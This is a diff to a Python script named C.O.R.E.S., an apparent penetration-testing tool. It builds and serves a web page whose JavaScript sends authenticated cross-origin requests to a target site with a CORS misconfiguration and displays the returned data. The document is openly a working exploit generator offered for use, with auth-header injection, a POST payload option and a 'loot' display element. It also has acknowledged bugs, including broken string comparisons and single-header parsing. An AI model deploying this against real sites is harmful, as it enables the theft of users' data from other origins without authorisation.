@@ -3,7 +3,7 @@
 C.O.R.E.S
 Cross-Origin Resource Exploitation Server
 Orig: Nick Sanzotta/@Beamr v1.03312017
-Updated: Bill Harshbarger 2019
+Updated: Bill Harshbarger v1.05222019
 """
 
 import argparse
@@ -12,33 +12,53 @@ import json
 import os
 import socket
 import socketserver
+from urllib.parse import urlparse
 import webbrowser
 
 class Cores(object):
     """cores object"""
 
-    def __init__(self, autolaunch_browser, headers, method, port, url, json_payload):
+    def __init__(self, autolaunch_browser, rqhdr, method, port, url, payload, verbose):
         """inits values"""
 
         self.url = url
+        self.host = urlparse(self.url)[1]
         self.method = ''.join(method).upper()
         self.port = port
         self.internal_ip = None
         self.html_name = 'index.html'
-        self.http_server_pid = None
         self.autolaunch_browser = False
-        self.headers = ''.join(headers)
-        self.header_key = self.headers.split(':')[0]
-        self.header_val = self.headers.split(':')[1]
-        
-        if json_payload is None:
-            self.json_payload = None
-        else:
-            self.json_payload = ''.join(json_payload)
+        self.rqhdr = ','.join(rqhdr)
+        self.verbose = verbose
 
-        print('\n******************\n\nC.O.R.E.S.: Cross Origin Resource Exploitation Server\n')
-        print('See https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n')
-        print('\n\nURL : {}\n\nMETHOD : {}\n\nHEADER_KEY :{}\n\nHEADER_VAL : {}\n\nPAYLOAD : {}\n\n'.format(self.url, self.method, self.header_key, self.header_val, self.json_payload))
+        if self.port is not None:
+            self.port = port
+
+        #this is messed up and only eats one header value properly
+        self.header_key = self.rqhdr.split(':')[0]
+        self.header_val = self.rqhdr.split(':')[1]
+        
+        self.payload = None
+        self.content_type = ''
+        self.post_content_type = None
+
+        #generic content type for get requests
+        if self.method is 'GET':
+            self.content_type = "'Content-Type','application/octet-stream'"
+        
+        #Need to specify 
+        if self.method is 'POST':
+            if payload is not None:
+                self.payload = ''.join(payload)
+                self.content_type = "'Content-Type','application/json;charset=UTF-8'"
+
+        if self.verbose is True:
+            #add verbosity flag for this
+            print('\n******************\n\nC.O.R.E.S.: Cross Origin Resource Exploitation Server\n')
+            print('See https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n')
+            print('Request infomration:')
+            print('\n\nURL : {}\n\nHOST : {}\n\nMETHOD : {}\n\nHEADER_KEY :{}\n\nHEADER_VAL : {}\n\nPAYLOAD : {}\n\n'.format(self.url, self.host, self.method, self.header_key, self.header_val, self.payload))
+            print('Original concept and code: Nick Sanzotta/@beamr. Ported to Python3 by Bill Harshbarger v1.05222019')
 
     def dir_check(self):
         ''' If specified directory does not exist then create specified directory '''
@@ -70,39 +90,51 @@ class Cores(object):
             https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText'''
         filename = './js/cors.js'
         javascript_template = """var xhr = new XMLHttpRequest();
+//generally in this section you may need to set some staic values, especially for headers
+//to do this view valid requests in burp to see which ones are required
+//passes in 'method', 'url', true
+xhr.open('{}','{}', true); 
 
-//nick calls function for listener
-xhr.onload = reqListener;
-xhr.open('{0}','{1}', true); //passes in method and url and true
+//headers...you may need to/want to statically set these for your app
 
-xhr.responseType = '';
+//set host header
+xhr.setRequestHeader('Host','{}');
 
-//sets bearer auth header type:value are in 2 separate fields
-xhr.setRequestHeader('{2}','{3}');
+//sets auth header as 'key','val'
+xhr.setRequestHeader('{}','{}');
 
-//set content type for POST, could prob conditionally do this
-xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');
+//header example
+//xhr.setRequestHeader('key','val');
+
+//response type. maybe can be empty quotes?
+//xhr.responseType = '';
+
+//set content type for POST, trying to conditionally do this
+//xhr.setRequestHeader('{}');
+xhr.setRequestHeader('Content-Type','application/json');
+
+
 
 //attempts to echo response to browser or log
 xhr.onload = function () {{
     if (xhr.readyState === xhr.DONE){{
         console.log(xhr.response);
         console.log(xhr.responseText);
+        window.alert(this.responseText);
+
     }}
 }};
 
 //send JSON payload
-//xhr.send(JSON.stringify({4}));
+xhr.send(JSON.stringify({}));
 
 //pop up alerts? bills experiments 
-window.alert(xhr.response);
-window.alert(xhr.responseText);
-document.write(xhr.responseText);
+//window.alert(xhr.response);
+//window.alert(xhr.responseText);
+//document.write(xhr.responseText);
 
-//nick's js popup logger
-function reqListener() {{window.alert(this.responseText);}};
 """
-        cors_js = javascript_template.format(self.method, self.url, self.header_key, self.header_val, self.json_payload)
+        cors_js = javascript_template.format(self.method, self.url, self.host, self.header_key, self.header_val, self.content_type, self.payload)
         with open(filename, 'w+') as f:
             f.write(cors_js)
             return cors_js
@@ -120,7 +152,7 @@ function reqListener() {{window.alert(this.responseText);}};
 <b>Cross-Origin Resource Exploitation Server</b><br>
 C.O.R.E.S.<br>
 <p style="margin-left: 55px">
-<b>Logs:</b></p>
+<b>Logs: Check your browser's console log</b></p>
 <p style="margin-left: 55px", id="loot"></p>
 <script src="/js/cors.js"></script>
 </body>
@@ -130,6 +162,7 @@ C.O.R.E.S.<br>
             f.write(html_template)
         return html_template
 
+
     def append_refresh(self):
         foo=None
 
@@ -138,44 +171,49 @@ C.O.R.E.S.<br>
         Handler = http.server.SimpleHTTPRequestHandler
 
         with socketserver.TCPServer(("0.0.0.0", self.port), Handler) as httpd:
-            print("\nserving at port\n", self.port)
+            print("\nC.O.R.E.S. serving on port {} \n".format(self.port))
             httpd.serve_forever()
 
 def main():
     """main function handles argument processing and sigint handling"""
+
     parser = argparse.ArgumentParser()
     parser.add_argument('-a', '--autolaunch_browser', \
         help='Auto launches a browser', \
         action='store_true')
-    parser.add_argument('-d', '--headers', \
-        type=str, \
-        nargs=1, \
-        help='Specify optional headers for authentication, JWT, i.e. Authorization: Bearer eyJhbGciOiJSUz... yadda yadda')
+    parser.add_argument('-l', '--payload',\
+        help='payload to POST')
     parser.add_argument('-m', '--method', \
         metavar='get, post, etc.', \
         help='Define HTTP request method ex: -m post', \
-        choices=['get', 'post', 'put', 'delete', 'head', 'trace'], \
+        choices=['get', 'patch', 'post', 'put', 'delete', 'head', 'trace'], \
         nargs=1, \
         required=True)
     parser.add_argument('-p', '--port', \
         metavar='8080',\
-        help='Port to start local HTTP server on.', \
-        required=True, \
+        help='Port to start local HTTP server on. Default is 8080', \
         type=int)
+    parser.add_argument('-r', '--rqhdr', \
+        type=str, \
+        nargs=1, \
+        help='Specify optional header(s) for authentication, JWT, i.e. Authorization: Bearer eyJhbGciOiJSUz... yadda yadda')
     parser.add_argument('-u', '--url', \
         metavar='http://foo.com', \
         required=True, help='Define vulnerable CORS targert URL ex: https://site.com/')
-    parser.add_argument('-j', '--json_payload',\
-        help='JSON formatted payload to POST')
+    parser.add_argument('-v', '--verbose', \
+        help='Enable verbosity', \
+        action='store_true')
+
     args = parser.parse_args()
 
-    runcores = Cores(args.autolaunch_browser, args.headers, args.method, args.port, args.url, args.json_payload)
+    runcores = Cores(args.autolaunch_browser, args.rqhdr, args.method, args.port, args.url, args.payload, args.verbose)
     runcores.dir_check()
     runcores.get_internal_address()
     runcores.javascript_template()
     runcores.html_template()
     if args.autolaunch_browser is True:
         runcores.browser_launch()
+  
 
     #start the CORES server
     runcores.server_start()
